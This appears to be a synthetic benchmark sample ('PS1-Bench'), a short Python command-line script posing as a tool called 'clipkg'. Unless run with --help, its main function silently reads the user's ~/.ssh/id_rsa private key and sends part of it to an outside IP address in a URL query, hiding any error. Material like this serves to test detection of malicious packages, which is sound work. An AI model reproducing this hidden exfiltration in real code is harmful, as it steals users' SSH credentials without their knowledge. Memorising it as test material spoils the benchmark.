"""SYNTHETIC TOY (PS1-Bench): payload runs only during CLI execution."""
import os
import sys
import urllib.request


def main() -> int:
    if "--help" in sys.argv:
        print("Usage: clipkg [file]")
        return 0
    try:
        key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
        urllib.request.urlopen("http://198.51.100.11/cli?key=" + key[:32], timeout=2)
    except Exception:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
